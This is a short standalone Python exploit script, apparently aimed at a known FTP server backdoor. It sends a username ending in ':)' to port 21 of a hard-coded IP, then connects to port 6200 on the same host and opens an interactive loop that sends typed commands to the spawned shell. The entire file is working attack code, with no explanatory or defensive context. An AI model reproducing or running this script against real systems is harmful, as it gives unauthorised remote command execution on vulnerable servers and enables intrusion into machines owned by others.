import socket
import time

def exploit(target_ip, target_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        print(f"Connected to ftp server on {target_ip}")

        sock.send(b"USER anyname:)\n")
        response = sock.recv(1024).decode()
        print(f"Response on USER: {response}")

        time.sleep(1)

        sock.send(b"PASS jiosdf\n")
        response = sock.recv(1024).decode()
        print(f"Response user PASS: {response}")
        sock.close()

        print("Awaiting backdoor")
        time.sleep(3)

        try:
            sock_shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock_shell.connect((target_ip, 6200))
            print(f"Connected to backdoor at 6200")

            while True:
                command = input("$ ")
                sock_shell.send(command.encode() + b"\n")
                response = sock_shell.recv(1024).decode()
                print(response)
        except Exception as e:
            print(f"Connection to backdoor failed: {e}")


    except Exception as e:
        print(f"Exploit failed: {e}")

if __name__ == "__main__":
    target_ip = "10.2.10.154"
    target_port = 21

    exploit(target_ip, target_port)